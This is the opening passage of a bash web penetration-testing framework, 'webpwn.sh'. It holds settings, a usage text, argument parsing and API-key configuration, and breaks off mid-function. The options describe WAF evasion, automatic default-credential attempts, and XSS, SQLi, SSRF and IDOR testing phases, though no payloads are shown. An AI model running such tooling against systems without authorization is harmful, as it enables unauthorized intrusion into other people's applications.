#!/usr/bin/env bash
# =============================================================================
#  webpwn.sh â€” Web Application Penetration Testing Framework
#  Full-pipeline web pentest: recon â†’ exploitation â†’ reporting
# =============================================================================
set -uo pipefail

# Prioritize Go bin so ProjectDiscovery tools (httpx, nuclei, katana) take precedence
export PATH="${HOME}/go/bin:/usr/local/go/bin:${HOME}/.local/bin:$PATH"

# â”€â”€â”€ Colors & Formatting â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# â”€â”€â”€ Banner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
banner() {
cat << 'EOF'
  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—
  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘
  â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘
  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
  â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
   â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â•      â•šâ•â•â•â•šâ•â•â• â•šâ•â•  â•šâ•â•â•â•
  Web Application Penetration Testing Framework v3.0 | 2026
EOF
}

# â”€â”€â”€ Logging helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
log_info()    { echo -e "${CYAN}[INFO]${RESET}  $*"; }
log_ok()      { echo -e "${GREEN}[OK]${RESET}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${RESET}  $*"; }
log_error()   { echo -e "${RED}[ERROR]${RESET} $*"; }
log_phase()   { echo -e "\n${BOLD}${MAGENTA}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${RESET}"; echo -e "${BOLD}${MAGENTA}  $*${RESET}"; echo -e "${BOLD}${MAGENTA}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${RESET}"; }
log_finding() {
    echo -e "${RED}${BOLD}[FINDING]${RESET} $*"
    # Also stream to live findings log if available
    [[ -n "${LIVE_FINDINGS_LOG:-}" ]] && \
        echo "[$(date '+%H:%M:%S')] [FINDING] $*" >> "$LIVE_FINDINGS_LOG" 2>/dev/null || true
}
log_dim()     { echo -e "${DIM}$*${RESET}"; }

# â”€â”€â”€ Defaults â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
TARGET=""
OUTDIR=""
THREADS=50
RATE_LIMIT=100          # nuclei requests/sec
SCAN_RATE=5000          # masscan rate
DEPTH=3                 # crawl depth
WORDLIST_DIR="/usr/share/seclists"
RESOLVERS_URL="https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt"
INTERACTSH_SERVER="oast.pro"  # Public interactsh server
NOTIFY_ENABLED=false
SCOPE_REGEX=""          # Optional: regex to restrict crawl scope
SKIP_BRUTEFORCE=false
SKIP_PORTSCAN=false
SKIP_CRAWL=false
SKIP_CONTENT=false
SKIP_VULNS=false
SKIP_SCREENSHOTS=false
SINGLE_PHASE=""         # Run only a specific phase
RESUME=false            # Resume from existing output (phase checkpoints)
BACKGROUND=false        # Detach into tmux/screen/nohup so SSH disconnect won't kill it
NO_TMUX=false           # Disable auto-tmux (run in foreground even outside tmux)
ORIG_ARGS=()            # Captured before parse_args for background re-launch
START_TIME=$(date +%s)

# â”€â”€â”€ URL-list / API mode â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
URL_LIST=""             # Path to file of target URLs (one per line) â€” skips recon
BASE_URL=""             # Set when -d is given a full URL (https://host) â€” seeds LIVE_HOSTS directly
API_MODE=false          # Optimized for internal API testing (skip port/screenshot/DNS phases)
DEPTH=3                 # Crawl depth (exposed as --depth)

# â”€â”€â”€ WAF detection state â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
WAF_DETECTED=false
WAF_NAME="none"
WAF_RATE_LIMIT=0        # 0 = unchanged; set by apply_waf_profile()
WAF_DELAY=0             # extra inter-request sleep when WAF present (seconds)
WAF_ENCODE=false        # apply payload encoding when WAF present
WAF_BYPASS_MODE=false   # --waf-bypass: force WAF-evasion techniques even if no WAF found
WAF_EVASION_CURL_OPTS=() # Extra curl args injected into probes when WAF detected (headers etc.)

# â”€â”€â”€ Auth settings â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
AUTH_TOKEN=""                   # Bearer token / JWT / API key
AUTH_COOKIE=""                  # Cookie string (e.g. "JSESSIONID=abc; token=xyz")
AUTH_HEADER=""                  # Raw auth header (e.g. "Authorization: Basic dXNlcjpwYXNz")
AUTH_USER=""                    # Username / email for login
AUTH_PASS=""                    # Password for login
AUTH_LOGIN_URL=""               # Login endpoint (e.g. http://target.com/login)
AUTH_FORM_USER_FIELD="username" # Form field name for username
AUTH_FORM_PASS_FIELD="password" # Form field name for password
TRY_DEFAULT_CREDS=true          # Auto-detect app and try known default credentials (always on)
AUTH_MODE="none"                # Populated by setup_auth: none|token|cookie|jwt|header|form|auto
AUTH_LOGIN_TYPE="none"          # Internal: cookie|jwt â€” what the login response returned
AUTH_BASE_REDIRECTS_TO_LOGIN=false  # true when base URL redirects to a login page
AUTH_DETECTED_LOGIN_URL=""          # Login URL found via redirect detection
AUTH_SESSION_FILE=""                # Curl cookie jar file path
AUTH_JWT_USER_ID=""             # Extracted from JWT claims (sub / user_id / uid)
AUTH_JWT_ROLE=""                # Extracted from JWT claims (role / scope / authorities)
JWT_COOKIE_NAME=""              # If JWT lives in a cookie, the cookie name (e.g. "access_token")
JWT_COOKIE_MODE=false           # true when JWT is transported in a cookie
JWT_REFRESH_TOKEN=""            # OAuth refresh token for session renewal during long scans
JWT_REFRESH_URL=""              # Token endpoint for refresh (POST with refresh_token grant)
JWT_EXPIRY=0                    # Unix ts extracted from exp claim; 0 = unknown
# Custom headers to inject into all requests (--header "Name: Value", repeatable)
CUSTOM_HEADERS_ARGS=()
# Populated by setup_auth() â€” injected into all scanning tools:
AUTH_CURL_OPTS=()
AUTH_HTTPX_OPTS=()
AUTH_NUCLEI_OPTS=()
AUTH_FFUF_OPTS=()
AUTH_KATANA_OPTS=()
AUTH_DALFOX_OPTS=()
AUTH_SQLMAP_OPTS=()
AUTH_FEROX_OPTS=()

# â”€â”€â”€ Secondary auth (low-privilege user â€” for IDOR / BAC testing) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
AUTH_USER2=""                   # Low-priv username / email
AUTH_PASS2=""                   # Low-priv password
AUTH_LOGIN_URL2=""              # Login URL for user2 (defaults to AUTH_LOGIN_URL)
AUTH_FORM_USER_FIELD2="username"
AUTH_FORM_PASS_FIELD2="password"
AUTH_ROLE1="highpriv"           # Label for user1 (shown in reports)
AUTH_ROLE2="lowpriv"            # Label for user2
# Populated by setup_auth_secondary():
AUTH2_MODE="none"
AUTH2_COOKIE=""
AUTH2_TOKEN=""
AUTH2_CURL_OPTS=()
AUTH2_HTTPX_OPTS=()
AUTH2_SESSION_FILE=""

# â”€â”€â”€ Notification settings â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Load from ~/.config/webpwn/notify.conf or set via CLI flags
TELEGRAM_BOT_TOKEN=""           # Telegram bot token (from @BotFather)
TELEGRAM_CHAT_ID=""             # Telegram chat/user ID
DISCORD_WEBHOOK_URL=""          # Discord webhook URL
NOTIFY_EMAIL_TO=""              # Destination email address
SMTP_HOST="smtp.gmail.com"      # SMTP server
SMTP_PORT="587"                 # SMTP port
SMTP_USER=""                    # SMTP username
SMTP_PASS=""                    # SMTP password
TG_LAST_UPDATE_ID=0             # Telegram polling state
TG_POLL_INTERVAL=30             # Seconds between command polls
TG_BOT_MODE=false               # Standalone bot listener mode
NOTIFY_CONF="${HOME}/.config/webpwn/notify.conf"
LEGACY_NOTIFY_CONF="${HOME}/.config/bbhunt/notify.conf"
TG_MSG_ID_FILE="${HOME}/.config/webpwn/tg_msg_ids.txt"
TG_MSG_ID_FILE_LEGACY="${HOME}/.config/bbhunt/tg_msg_ids.txt"
STATE_FILE="${HOME}/.config/webpwn/scan.state"    # Shared scan state (bot+scan sync)

# â”€â”€â”€ Usage â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
usage() {
    echo -e "${BOLD}Usage:${RESET} $0 -d <domain> [options]"
    echo
    echo -e "${BOLD}Required:${RESET}"
    echo "  -d <domain|url>     Target domain (e.g. example.com) OR base URL (e.g. https://app.example.com)"
    echo "                      Passing a full URL skips subdomain recon, DNS, and port scan."
    echo
    echo -e "${BOLD}Options:${RESET}"
    echo "  -o <dir>            Output directory (default: ./results/<domain>_<date>)"
    echo "  -t <threads>        Thread count (default: 50)"
    echo "  -r <rate>           Nuclei request rate/sec (default: 100)"
    echo "  -w <wordlist_dir>   SecLists base directory (default: /usr/share/seclists)"
    echo "  -s <regex>          Scope regex for crawling (e.g. '.*\.example\.com')"
    echo "  -p <phase>          Run single phase only:"
    echo "                      recon|dns|ports|http|infra|waf|crawl|content|vulns|"
    echo "                      xss|sqli|ssrf|ssti|xxe|jwt|graphql|secrets|"
    echo "                      takeover|cors|403|idor|bac|screenshots|report"
    echo "  --background        Run scan in background (tmux > screen > nohup). Safe against"
    echo "                      SSH disconnects. Attach with: tmux attach -t webpwn_<domain>"
    echo "  --no-tmux           Disable auto-tmux; run in current shell (default: auto-tmux)"
    echo "  --resume            Resume interrupted scan â€” completed phases are skipped via"
    echo "                      checkpoint files (.phase_<name>.done in output dir)"
    echo "  --waf-bypass        Force WAF evasion mode (rate throttle + payload encoding)"
    echo "  --api-mode          Optimized for internal API testing: skip subdomain recon,"
    echo "                      port scanning, screenshots; inject JSON Accept header."
    echo "                      Combine with --urls for a purely URL-list driven scan."
    echo "  --urls <file>       File of target URLs (one per line). These become the live"
    echo "                      host list; subdomain recon, DNS and port phases are skipped."
    echo "  --header <h>        Add custom header to ALL requests (repeatable)."
    echo "                      e.g. --header \"X-Org-Id: 42\" --header \"X-Feature: beta\""
    echo "  --depth <n>         Crawl depth (default: 3)"
    echo "  --skip-bruteforce   Skip DNS bruteforce (faster)"
    echo "  --skip-portscan     Skip port scanning"
    echo "  --skip-crawl        Skip web crawling"
    echo "  --skip-content      Skip directory/file bruteforce (ffuf/feroxbuster)"
    echo "  --skip-vulns        Skip vulnerability scanning"
    echo "  --skip-screenshots  Skip screenshots"
    echo "  --notify            Enable notify (Slack/Telegram/Discord)"
    echo "  --install           Install all required tools"
    echo "  --check             Check tool availability"
    echo "  -h                  Show this help"
    echo
    echo -e "${BOLD}Authentication (covers all common schemes â€” JWT-first for API/org use):${RESET}"
    echo "  --auth-token <token>        Bearer token / JWT / API key (adds Authorization: Bearer)"
    echo "  --auth-cookie <cookie>      Cookie string (e.g. \"JSESSIONID=abc; token=xyz\")"
    echo "  --auth-header <header>      Raw auth header (e.g. \"Authorization: Basic dXNlcjpwYXNz\")"
    echo "  --auth-user <user>          Username for form-based / API login"
    echo "  --auth-pass <pass>          Password for form-based / API login"
    echo "  --auth-login-url <url>      Login endpoint URL (required with --auth-user/pass)"
    echo "  --auth-form-user <field>    Login form username field name (default: username)"
    echo "  --auth-form-pass <field>    Login form password field name (default: password)"
    echo "  --jwt-cookie <name>         JWT is stored in a cookie (e.g. --jwt-cookie access_token)"
    echo "                              Use with --auth-token to set the initial value."
    echo "  --refresh-token <token>     OAuth refresh token for automatic session renewal"
    echo "  --refresh-url <url>         OAuth token endpoint (used with --refresh-token)"
    echo "  --try-default-creds         Auto-detect app type and try known default credentials (ON by default)"
    echo "  --no-default-creds          Disable default credential testing"
    echo "  --auth-role1 <label>        Label for primary user in reports (default: highpriv)"
    echo "  --auth-role2 <label>        Label for secondary user in reports (default: lowpriv)"
    echo
    echo -e "${BOLD}Second user (low-privilege) â€” enables IDOR & Broken Access Control testing:${RESET}"
    echo "  --auth-user2 <user>         Low-priv username / email"
    echo "  --auth-pass2 <pass>         Low-priv password"
    echo "  --auth-login-url2 <url>     Login URL for user2 (defaults to --auth-login-url)"
    echo "  --auth-form-user2 <field>   Form field for user2 username (default: username)"
    echo "  --auth-form-pass2 <field>   Form field for user2 password (default: password)"
    echo
    echo -e "${BOLD}Examples (auth + org JWT workflows):${RESET}"
    echo "  $0 -d app.com --auth-user admin@app.com --auth-pass secret --auth-login-url https://app.com/api/login"
    echo "  $0 -d app.com --auth-user admin --auth-pass pass --auth-user2 user --auth-pass2 pass2 --auth-login-url https://app.com/login"
    echo "  $0 -d app.com --auth-token eyJhbGciOiJIUzI1NiJ9..."
    echo "  $0 -d app.com --auth-token eyJ... --jwt-cookie access_token"
    echo "  $0 -d app.com --auth-user me@corp.com --auth-pass p --auth-login-url https://app.com/auth/login \\"
    echo "       --refresh-token <rt> --refresh-url https://app.com/auth/refresh"
    echo "  $0 --urls targets.txt --auth-token eyJ... --api-mode --no-tmux"
    echo "  $0 -d app.com --api-mode --header \"X-Org-Id: 123\" --header \"X-Client: ios\""
    echo
    echo -e "${BOLD}Notifications (Telegram / Discord / Email):${RESET}"
    echo "  --tg-token <token>          Telegram bot token"
    echo "  --tg-chat <id>              Telegram chat ID (run: @userinfobot to get yours)"
    echo "  --discord <webhook_url>     Discord webhook URL"
    echo "  --email <address>           Email address for notifications"
    echo "  --smtp-host <host>          SMTP server (default: smtp.gmail.com)"
    echo "  --smtp-port <port>          SMTP port (default: 587)"
    echo "  --smtp-user <user>          SMTP username"
    echo "  --smtp-pass <pass>          SMTP password"
    echo "  --bot-listen                Start Telegram bot listener (accept scan commands from phone)"
    echo "  --setup-notify              Create sample ~/.config/webpwn/notify.conf and exit"
    echo "  (Config file: ~/.config/webpwn/notify.conf â€” set TELEGRAM_BOT_TOKEN= etc.)"
    echo
    echo -e "${BOLD}Examples:${RESET}"
    echo "  $0 -d example.com"
    echo "  $0 -d example.com -o /tmp/scan --skip-portscan"
    echo "  $0 -d example.com -p recon"
    echo "  $0 --urls targets.txt -p vulns                  # WAF check auto-runs first, then nuclei"
    echo "  $0 --urls targets.txt -p xss --auth-token eyJ..."
    echo "  $0 --urls targets.txt -p sqli --waf-bypass"
    echo "  $0 -d example.com --try-default-creds"
    echo "  $0 -d example.com --auth-cookie \"JSESSIONID=abc123\""
    echo "  $0 -d example.com --auth-token \"eyJhbGciOiJIUzI1NiJ9...\""
    echo "  $0 -d example.com --auth-user admin --auth-pass admin --auth-login-url http://example.com/login"
    echo "  $0 --install"
    exit 0
}

# â”€â”€â”€ Argument parsing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
parse_args() {
    [[ $# -eq 0 ]] && usage
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d) TARGET="$2"; shift 2 ;;
            -o) OUTDIR="$2"; shift 2 ;;
            -t) THREADS="$2"; shift 2 ;;
            -r) RATE_LIMIT="$2"; shift 2 ;;
            -w) WORDLIST_DIR="$2"; shift 2 ;;
            -s) SCOPE_REGEX="$2"; shift 2 ;;
            -p) SINGLE_PHASE="$2"; shift 2 ;;
            --resume) RESUME=true; shift ;;
            --skip-bruteforce) SKIP_BRUTEFORCE=true; shift ;;
            --skip-portscan) SKIP_PORTSCAN=true; shift ;;
            --skip-crawl) SKIP_CRAWL=true; shift ;;
            --skip-content) SKIP_CONTENT=true; shift ;;
            --skip-vulns) SKIP_VULNS=true; shift ;;
            --skip-screenshots) SKIP_SCREENSHOTS=true; shift ;;
            --background) BACKGROUND=true; shift ;;
            --no-tmux) NO_TMUX=true; shift ;;
            --api-mode) API_MODE=true; SKIP_PORTSCAN=true; SKIP_SCREENSHOTS=true; SKIP_BRUTEFORCE=true; shift ;;
            --urls) URL_LIST="$2"; shift 2 ;;
            --header) CUSTOM_HEADERS_ARGS+=("$2"); shift 2 ;;
            --depth) DEPTH="$2"; shift 2 ;;
            --jwt-cookie) JWT_COOKIE_NAME="$2"; JWT_COOKIE_MODE=true; shift 2 ;;
            --refresh-token) JWT_REFRESH_TOKEN="$2"; shift 2 ;;
            --refresh-url) JWT_REFRESH_URL="$2"; shift 2 ;;
            --waf-bypass) WAF_BYPASS_MODE=true; shift ;;
            --notify) NOTIFY_ENABLED=true; shift ;;
            --auth-token) AUTH_TOKEN="$2"; shift 2 ;;
            --auth-cookie) AUTH_COOKIE="$2"; shift 2 ;;
            --auth-header) AUTH_HEADER="$2"; shift 2 ;;
            --auth-user) AUTH_USER="$2"; shift 2 ;;
            --auth-pass) AUTH_PASS="$2"; shift 2 ;;
            --auth-login-url) AUTH_LOGIN_URL="$2"; shift 2 ;;
            --auth-form-user) AUTH_FORM_USER_FIELD="$2"; shift 2 ;;
            --auth-form-pass) AUTH_FORM_PASS_FIELD="$2"; shift 2 ;;
            --try-default-creds) TRY_DEFAULT_CREDS=true; shift ;;
            --no-default-creds) TRY_DEFAULT_CREDS=false; shift ;;
            --auth-role1) AUTH_ROLE1="$2"; shift 2 ;;
            --auth-role2) AUTH_ROLE2="$2"; shift 2 ;;
            --auth-user2) AUTH_USER2="$2"; shift 2 ;;
            --auth-pass2) AUTH_PASS2="$2"; shift 2 ;;
            --auth-login-url2) AUTH_LOGIN_URL2="$2"; shift 2 ;;
            --auth-form-user2) AUTH_FORM_USER_FIELD2="$2"; shift 2 ;;
            --auth-form-pass2) AUTH_FORM_PASS_FIELD2="$2"; shift 2 ;;
            --tg-token) TELEGRAM_BOT_TOKEN="$2"; shift 2 ;;
            --tg-chat)  TELEGRAM_CHAT_ID="$2"; shift 2 ;;
            --discord)  DISCORD_WEBHOOK_URL="$2"; shift 2 ;;
            --email)    NOTIFY_EMAIL_TO="$2"; shift 2 ;;
            --smtp-host) SMTP_HOST="$2"; shift 2 ;;
            --smtp-port) SMTP_PORT="$2"; shift 2 ;;
            --smtp-user) SMTP_USER="$2"; shift 2 ;;
            --smtp-pass) SMTP_PASS="$2"; shift 2 ;;
            --bot-listen) TG_BOT_MODE=true; shift ;;
            --setup-notify) setup_notify_config; exit 0 ;;
            --install) install_tools; exit 0 ;;
            --check) check_tools; exit 0 ;;
            -h|--help) usage ;;
            *) log_error "Unknown argument: $1"; usage ;;
        esac
    done
    $TG_BOT_MODE && return   # bot-listen mode doesn't need a target

    # -d with a full URL (e.g. https://app.example.com or https://app.example.com/api):
    # strip scheme + path â†’ use hostname as TARGET, seed LIVE_HOSTS with the base URL,
    # and skip subdomain recon/DNS/port phases (same behaviour as --urls).
    if [[ "$TARGET" =~ ^https?:// ]]; then
        local _base_url; _base_url=$(echo "$TARGET" | grep -oP '^https?://[^/]+')
        TARGET=$(echo "$_base_url" | grep -oP '(?<=://)[^/:]+')
        [[ -z "$TARGET" ]] && { log_error "Could not parse hostname from URL: $TARGET"; exit 1; }
        URL_LIST=""          # not a file â€” handled via direct seed below
        BASE_URL="$_base_url"  # remembered for setup_output to seed LIVE_HOSTS
        SKIP_BRUTEFORCE=true
        log_info "Base-URL mode: target=${TARGET}, recon/DNS/port phases skipped"
        log_info "Base URL: ${_base_url}"
    fi

    # --urls mode: derive a synthetic TARGET from the file if -d not given
    if [[ -n "$URL_LIST" && -z "$TARGET" ]]; then
        if [[ ! -f "$URL_LIST" ]]; then
            log_error "URL list file not found: $URL_LIST"; exit 1
        fi
        # Use first hostname as TARGET for directory naming
        TARGET=$(head -1 "$URL_LIST" | grep -oP '(?<=://)[^/:]+' | head -1)
        [[ -z "$TARGET" ]] && TARGET="urllist"
        # Skip recon/DNS/port phases automatically
        SKIP_BRUTEFORCE=true
        log_info "URL-list mode: target derived as '${TARGET}', recon phases skipped"
    fi

    [[ -z "$TARGET" ]] && { log_error "Target domain (-d) or URL list (--urls) required."; usage; }
}

# â”€â”€â”€ API Keys: load env file and write provider configs for all tools â”€â”€â”€â”€â”€â”€â”€â”€â”€
_load_api_keys() {
    local _keys_file=""
    # Look for api_keys.env next to the script, then in the working directory
    for _f in "$(dirname "$(realpath "$0")")/api_keys.env" "$(pwd)/api_keys.env" "$HOME/.webpwn/api_keys.env"; do
        [[ -f "$_f" ]] && { _keys_file="$_f"; break; }
    done

    if [[ -z "$_keys_file" ]]; then
        log_warn "No api_keys.env found â€” running with no API keys (limited sources). Create ${HOME}/.webpwn/api_keys.env or place it next to webpwn.sh."
        return 0
    fi

    # shellcheck source=/dev/null
    set -a; source "$_keys_file"; set +a
    log_info "API keys loaded from: ${_keys_file}"

    # â”€â”€ subfinder provider config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    mkdir -p "${HOME}/.config/subfinder"
    cat > "${HOME}/.config/subfinder/provider-config.yaml" << SUBFINDER_EOF
binaryedge:
  - ${BINARYEDGE_KEY:-}
censys:
  - ${CENSYS_API_ID:-}:${CENSYS_API_SECRET:-}
chaos:
  - ${PDCP_API_KEY:-}
github:
  - ${GITHUB_TOKEN:-}
hunter:
  - ${HUNTER_KEY:-}
intelx:
  - ${INTELX_KEY:-}
passivetotal:
  - ${PASSIVETOTAL_USER:-}:${PASSIVETOTAL_KEY:-}
securitytrails:
  - ${SECURITYTRAILS_KEY:-}
shodan:
  - ${SHODAN_API_KEY:-}
urlscan:
  - ${URLSCAN_KEY:-}
virustotal:
  - ${VIRUSTOTAL_KEY:-}
whoisxmlapi:
  - ${WHOISXML_KEY:-}
zoomeye:
  - ${ZOOMEYE_KEY:-}
netlas:
  - ${NETLAS_KEY:-}
leakix:
  - ${LEAKIX_KEY:-}
fullhunt:
  - ${FULLHUNT_KEY:-}
SUBFINDER_EOF

    # â”€â”€ amass datasources config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    mkdir -p "${HOME}/.config/amass"
    cat > "${HOME}/.config/amass/datasources.yaml" << AMASS_EOF
datasources:
  - name: AlienVault
    ttl: 4320
    creds:
      account: ""
      secret: "${OTX_KEY:-}"
  - name: BinaryEdge
    ttl: 4320
    creds:
      secret: "${BINARYEDGE_KEY:-}"
  - name: Censys
    ttl: 4320
    creds:
      username: "${CENSYS_API_ID:-}"
      password: "${CENSYS_API_SECRET:-}"
  - name: GitHub
    ttl: 4320
    creds:
      secret: "${GITHUB_TOKEN:-}"
  - name: NetworksDB
    ttl: 4320
    creds:
      secret: ""
  - name: PassiveTotal
    ttl: 4320
    creds:
      username: "${PASSIVETOTAL_USER:-}"
      password: "${PASSIVETOTAL_KEY:-}"
  - name: SecurityTrails
    ttl: 4320
    creds:
      secret: "${SECURITYTRAILS_KEY:-}"
  - name: Shodan
    ttl: 4320
    creds:
      secret: "${SHODAN_API_KEY:-}"
  - name: URLScan
    ttl: 4320
    creds:
      secret: "${URLSCAN_KEY:-}"
  - name: VirusTotal
    ttl: 4320
    creds:
      secret: "${VIRUSTOTAL_KEY:-}"
  - name: WhoisXMLAPI
    ttl: 4320
    creds:
      secret: "${WHOISXML_KEY:-}"
  - name: ZoomEye
    ttl: 4320
    creds:
      secret: "${ZOOMEYE_KEY:-}"
AMASS_EOF

    # â”€â”€ chaos client â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    [[ -n "${PDCP_API_KEY:-}" ]] && export CHAOS_KEY="$PDCP_API_KEY"

    # â”€â”€ shodan CLI init â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -n "${SHODAN_API_KEY:-}" ]] && require_tool shodan; then
        shodan init "$SHODAN_API_KEY" 2>/dev/null || true
    fi

    # â”€â”€ findomain env vars â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
